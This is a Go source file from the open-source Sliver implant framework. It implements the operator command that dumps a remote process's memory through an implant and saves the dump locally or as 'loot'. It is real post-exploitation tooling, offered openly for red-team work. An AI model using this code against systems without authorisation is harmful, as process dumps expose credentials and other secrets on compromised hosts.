package processes

/*
	Sliver Implant Framework
	Copyright (C) 2021  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import (
	"context"
	"fmt"
	"os"
	"path/filepath"
	"time"

	"github.com/spf13/cobra"
	"google.golang.org/protobuf/proto"

	"github.com/bishopfox/sliver/client/command/loot"
	"github.com/bishopfox/sliver/client/console"
	"github.com/bishopfox/sliver/protobuf/clientpb"
	"github.com/bishopfox/sliver/protobuf/sliverpb"
)

// ProcdumpCmd - Dump the memory of a remote process
func ProcdumpCmd(cmd *cobra.Command, con *console.SliverConsoleClient, args []string) {
	session, beacon := con.ActiveTarget.GetInteractive()
	if session == nil && beacon == nil {
		return
	}

	pid, _ := cmd.Flags().GetInt("pid")
	name, _ := cmd.Flags().GetString("name")
	saveTo, _ := cmd.Flags().GetString("save")
	saveLoot, _ := cmd.Flags().GetBool("loot")
	lootName, _ := cmd.Flags().GetString("loot-name")

	if pid == -1 && name != "" {
		pid = GetPIDByName(cmd, name, con)
	}
	if pid == -1 {
		con.PrintErrorf("Invalid process target\n")
		return
	}

	timeout, _ := cmd.Flags().GetInt32("timeout")

	if timeout < 1 {
		con.PrintErrorf("Invalid timeout argument\n")
		return
	}

	ctrl := make(chan bool)
	con.SpinUntil("Dumping remote process memory ...", ctrl)

	dump, err := con.Rpc.ProcessDump(context.Background(), &sliverpb.ProcessDumpReq{
		Request: con.ActiveTarget.Request(cmd),
		Pid:     int32(pid),
		Timeout: timeout,
	})
	ctrl <- true
	<-ctrl
	if err != nil {
		con.PrintErrorf("%s\n", err)
		return
	}

	hostname := getHostname(session, beacon)
	if dump.Response != nil && dump.Response.Async {
		con.AddBeaconCallback(dump.Response.TaskID, func(task *clientpb.BeaconTask) {
			err = proto.Unmarshal(task.Response, dump)
			if err != nil {
				con.PrintErrorf("Failed to decode response %s\n", err)
				return
			}
			if saveLoot {
				LootProcessDump(dump, lootName, hostname, pid, con)
			}

			if !saveLoot || saveTo != "" {
				PrintProcessDump(dump, saveTo, hostname, pid, con)
			}
		})
		con.PrintAsyncResponse(dump.Response)
	} else {
		if saveLoot {
			LootProcessDump(dump, lootName, hostname, pid, con)
		}

		if !saveLoot || saveTo != "" {
			PrintProcessDump(dump, saveTo, hostname, pid, con)
		}
	}
}

// PrintProcessDump - Handle the results of a process dump
func PrintProcessDump(dump *sliverpb.ProcessDump, saveTo string, hostname string, pid int, con *console.SliverConsoleClient) {
	var err error
	var saveToFile *os.File
	if saveTo == "" {
		tmpFileName := filepath.Base(fmt.Sprintf("procdump_%s_%d_*", hostname, pid))
		saveToFile, err = os.CreateTemp("", tmpFileName)
		if err != nil {
			con.PrintErrorf("Error creating temporary file: %s\n", err)
			return
		}
	} else {
		saveToFile, err = os.OpenFile(saveTo, os.O_WRONLY|os.O_CREATE, 0o600)
		if err != nil {
			con.PrintErrorf("Error creating file: %s\n", err)
			return
		}
	}
	defer saveToFile.Close()
	saveToFile.Write(dump.GetData())
	con.PrintInfof("Process dump stored in: %s\n", saveToFile.Name())
}

func getHostname(session *clientpb.Session, beacon *clientpb.Beacon) string {
	if session != nil {
		return session.Hostname
	}
	if beacon != nil {
		return beacon.Hostname
	}
	return ""
}

func LootProcessDump(dump *sliverpb.ProcessDump, lootName string, hostName string, pid int, con *console.SliverConsoleClient) {
	timeNow := time.Now().UTC()
	dumpFileName := fmt.Sprintf("procdump_%s_%d_%s.dmp", hostName, pid, timeNow.Format("20060102150405"))

	if lootName == "" {
		lootName = dumpFileName
	}

	lootMessage := loot.CreateLootMessage(con.ActiveTarget.GetHostUUID(), dumpFileName, lootName, clientpb.FileType_BINARY, dump.GetData())
	loot.SendLootMessage(lootMessage, con)
}
